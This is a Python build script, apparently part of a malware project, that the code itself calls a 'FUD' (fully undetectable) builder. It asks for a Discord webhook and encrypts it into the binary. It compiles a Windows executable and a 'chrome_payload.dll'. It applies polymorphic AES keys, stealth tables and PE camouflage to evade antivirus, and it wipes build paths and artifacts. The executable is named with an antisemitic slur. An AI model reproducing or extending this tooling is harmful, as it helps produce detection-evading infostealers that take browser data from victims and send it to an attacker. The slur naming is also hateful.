#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Build System - Generates unique binary every build
All strings AES-256-GCM encrypted, keys randomized per build, PE modified per build.
Usage: python build.py
"""

import os
import sys
import json
import shutil
import random
import string
import subprocess
import struct
from datetime import datetime
from typing import List

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from build_utils.strings_db import get_all_strings
from build_utils.encrypt_gen import generate_module
from build_utils.pe_modifier import post_process_pe
from build_utils.sign import sign_pe_simple
from build_utils.stealth_gen import generate_stealth_tables
from build_utils.import_injector import inject_legitimate_imports
from build_utils.polymorphic_gen import generate_polymorphic_keys

# ===== CONFIGURATION =====
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
ENCRYPTED_RS = os.path.join(PROJECT_ROOT, "src", "encrypted.rs")
STEALTH_RS = os.path.join(PROJECT_ROOT, "src", "inject", "src", "stealth_tables.rs")
POLYMORPHIC_RS = os.path.join(PROJECT_ROOT, "src", "polymorphic_keys.rs")
POLYMORPHIC_INJECT_RS = os.path.join(PROJECT_ROOT, "src", "inject", "src", "polymorphic_keys.rs")
RELEASE_DIR = os.path.join(PROJECT_ROOT, "release")

# On Linux, cross-compile for Windows; on Windows build natively
import platform as _platform
if _platform.system() == "Windows":
    _CARGO_EXTRA = []
    _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "release")
else:
    _CARGO_EXTRA = ["--target", "x86_64-pc-windows-gnu"]
    _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "x86_64-pc-windows-gnu", "release")

TARGET_EXE = os.path.join(_TARGET_REL, "jewish.exe")
TARGET_DLL = os.path.join(_TARGET_REL, "chrome_payload.dll")


# ===== UTILITY FUNCTIONS =====

def generate_random_name(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_prefix(length=3):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def generate_random_suffix():
    return random.randint(1000, 9999)


# ===== BUILD COMMANDS =====

def run_command(cmd: List[str], description: str) -> bool:
    print(f"[*] {description}...")
    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            cwd=PROJECT_ROOT,
            env={**os.environ}
        )
        for line in process.stdout:
            if line.strip():
                print(line.rstrip())
        process.wait()
        if process.returncode != 0:
            print(f"[!] {description} FAILED (code {process.returncode})")
            return False
        print(f"[+] {description} OK")
        return True
    except Exception as e:
        print(f"[!] Exception in {description}: {e}")
        return False


# ===== MAIN =====

def main():
    print("=" * 60)
    print("   FUD Build System - Jewish Builder v2")
    print("   Every build is a unique variant")
    print("=" * 60)

    # Load webhook from config.json or prompt
    config_path = os.path.join(PROJECT_ROOT, "config.json")
    webhook = None
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
                webhook = cfg.get("webhook", "").strip()
        except Exception as e:
            print(f"[!] Failed to read config.json: {e}")

    if not webhook:
        webhook = input("\nEnter Discord webhook URL: ").strip()
        if not webhook:
            print("[!] No webhook provided.")
            sys.exit(1)

    # Generate random parameters
    prefix = generate_random_prefix()
    suffix = generate_random_suffix()
    random_name = generate_random_name()

    print(f"\n[+] Build parameters:")
    print(f"    Prefix: {prefix}")
    print(f"    Suffix: {suffix}")
    print(f"    Output: {random_name}.exe")

    # Step 1: Generate encrypted.rs with all strings + webhook
    print("\n===== 1/7 Generating encrypted strings =====")
    strings = get_all_strings()
    generate_module(
        strings=strings,
        output_path=ENCRYPTED_RS,
        include_webhook=True,
        webhook_url=webhook
    )
    if not os.path.exists(ENCRYPTED_RS):
        print("[!] Failed to generate encrypted.rs")
        sys.exit(1)
    print(f"[+] Generated {ENCRYPTED_RS} ({os.path.getsize(ENCRYPTED_RS)} bytes)")

    # Step 1b: Generate per-build stealth decryption tables (unique AES-256-GCM keys per DLL/export name)
    print("\n[*] Generating stealth tables...")
    generate_stealth_tables(STEALTH_RS)
    if not os.path.exists(STEALTH_RS):
        print("[!] Failed to generate stealth_tables.rs")
        sys.exit(1)
    print(f"[+] Generated {STEALTH_RS}")

    # Step 1c: Generate polymorphic AES-256-GCM keys for kill.rs, lib.rs, api.rs
    print("\n[*] Generating polymorphic AES keys...")
    generate_polymorphic_keys(os.path.join(PROJECT_ROOT, "src"))
    if not os.path.exists(POLYMORPHIC_RS):
        print("[!] Failed to generate polymorphic_keys.rs")
        sys.exit(1)
    print(f"[+] Generated {POLYMORPHIC_RS}")

    # Step 2: Set environment variables for build.rs
    os.environ["COMPILE_PREFIX"] = prefix
    os.environ["COMPILE_SUFFIX"] = str(suffix)
    # Remap ALL source paths (absolute, home, and relative cwd) so no real
    # paths survive in panic messages or debug metadata.
    _home        = os.path.expanduser("~")
    _cargo_home  = os.environ.get("CARGO_HOME", os.path.join(_home, ".cargo"))
    # /usr/local/cargo is the default on many CI/Linux systems
    _remap  = (
        f"--remap-path-prefix={PROJECT_ROOT}=/b "
        f"--remap-path-prefix={_home}=/h "
        f"--remap-path-prefix={_cargo_home}=/c "     # ~/.cargo/registry/src/...
        f"--remap-path-prefix=/usr/local/cargo=/c "  # system cargo on Linux build hosts
        f"--remap-path-prefix=/rust/deps=/c "        # rustc internal deps path
        f"--remap-path-prefix=/rustc=/r "            # rustc stdlib source paths
        f"--remap-path-prefix=.=/b "                 # relative paths used by some macros
        f"--remap-path-prefix=src=/b/s "             # bare "src/…" references
        f"-C debuginfo=0 "                           # strip all debug info at compile time
        f"-C force-frame-pointers=n"                 # no frame pointers
    )
    os.environ["RUSTFLAGS"] = (os.environ.get("RUSTFLAGS", "") + " " + _remap).strip()

    # Step 3: Build payload DLL (64-bit)
    print("\n===== 2/7 Building Payload DLLs =====")
    if not run_command(["cargo", "build", "--release", "-p", "chrome-payload"] + _CARGO_EXTRA, "Building chrome_payload.dll (64-bit)"):
        print("[!] Payload build failed - aborting")
        sys.exit(1)
    if not os.path.exists(TARGET_DLL):
        print(f"[!] DLL not produced at {TARGET_DLL}")
        sys.exit(1)
    dll_size = os.path.getsize(TARGET_DLL)
    print(f"[+] DLL (64-bit) size: {dll_size} bytes")

    # Step 4: Build main executable
    print("\n===== 3/7 Building jewish.exe =====")
    env = {**os.environ}
    try:
        process = subprocess.Popen(
            ["cargo", "build", "--release", "-p", "jewish"] + _CARGO_EXTRA,
            cwd=PROJECT_ROOT, env=env,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        for line in process.stdout:
            print(line, end="")
        if process.wait() != 0:
            print("[!] Main build failed - aborting")
            sys.exit(1)
    except Exception as e:
        print(f"[!] Build error: {e}")
        sys.exit(1)

    # Step 5: PE camouflation (full LIEF modifications + light header patch)
    print("\n===== 4/7 PE camouflation =====")
    if os.path.exists(TARGET_EXE):
        # Full PE post-processing: section randomization, garbage section, header
        # randomization, entropy normalization, overlay, etc.
        try:
            post_process_pe(TARGET_EXE)
        except Exception as e:
            print(f"[!] post_process_pe failed: {e}")
        # Light header patch as additional pass (timestamp + debug dir)
        try:
            from build_utils.camouflage import camouflage_pe
            camouflage_pe(TARGET_EXE)
        except Exception as e:
            print(f"[!] Camouflage failed: {e}")
    else:
        print(f"[!] {TARGET_EXE} not found for post-processing")

    # Step 6: Copy to release
    print("\n===== 5/7 Copying to release =====")
    if not os.path.exists(TARGET_EXE):
        print(f"[!] {TARGET_EXE} not found!")
        sys.exit(1)

    if not os.path.exists(RELEASE_DIR):
        os.makedirs(RELEASE_DIR)

    # Clean release/ — keep only one binary at a time
    removed = 0
    for entry in os.listdir(RELEASE_DIR):
        entry_path = os.path.join(RELEASE_DIR, entry)
        if os.path.isfile(entry_path):
            try:
                os.remove(entry_path)
                removed += 1
            except OSError as e:
                print(f"[!] Could not remove {entry}: {e}")
    if removed:
        print(f"[*] Cleaned {removed} old file(s) from release/")

    dst_exe = os.path.join(RELEASE_DIR, f"{random_name}.exe")
    dst_info = os.path.join(RELEASE_DIR, f"{random_name}.info")

    shutil.copy2(TARGET_EXE, dst_exe)
    size = os.path.getsize(dst_exe)

    with open(dst_info, 'w', encoding='utf-8') as f:
        f.write(f"Build: {random_name}\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Webhook: AES-256-GCM encrypted\n")
        f.write(f"Prefix: {prefix}\n")
        f.write(f"Suffix: {suffix}\n")
        f.write(f"File size: {size} bytes\n")
        f.write(f"Original binary: jewish.exe\n")

    print(f"[+] Binary copied to {dst_exe} ({size} bytes)")
    print(f"[+] Build info saved to {dst_info}")

    # Step 7: Clean up build artifacts
    print("\n===== 6/7 Cleaning build artifacts =====")
    target_dir = os.path.join(PROJECT_ROOT, "target")
    if os.path.exists(target_dir):
        try:
            # On Windows, files may still be locked by antivirus / file handles.
            # Retry several times with a short delay before giving up.
            for attempt in range(5):
                try:
                    shutil.rmtree(target_dir)
                    print(f"[+] Removed {target_dir}")
                    break
                except OSError:
                    if attempt < 4:
                        import time
                        time.sleep(0.5)
                    else:
                        # Last attempt: try removing file by file
                        removed = 0
                        for root, dirs, files in os.walk(target_dir, topdown=False):
                            for f in files:
                                try:
                                    os.remove(os.path.join(root, f))
                                    removed += 1
                                except OSError:
                                    pass
                            for d in dirs:
                                try:
                                    os.rmdir(os.path.join(root, d))
                                except OSError:
                                    pass
                        try:
                            os.rmdir(target_dir)
                            print(f"[+] Removed {target_dir} (after {removed} file(s) cleaned)")
                        except OSError as e:
                            print(f"[!] Warning: could not fully remove target/: {e}")
        except Exception as e:
            print(f"[!] Warning: could not fully remove target/: {e}")

    # Step 7b: Clean up generated files (regenerated each build)
    for gen_file in [ENCRYPTED_RS, STEALTH_RS, POLYMORPHIC_RS, POLYMORPHIC_INJECT_RS]:
        if os.path.exists(gen_file):
            try:
                os.remove(gen_file)
                print(f"[+] Removed {gen_file}")
            except Exception as e:
                print(f"[!] Could not remove {gen_file}: {e}")

    print("\n" + "=" * 60)
    print(f"   7/7 BUILD COMPLETE: release/{random_name}.exe")
    print("=" * 60)


if __name__ == "__main__":
    main()

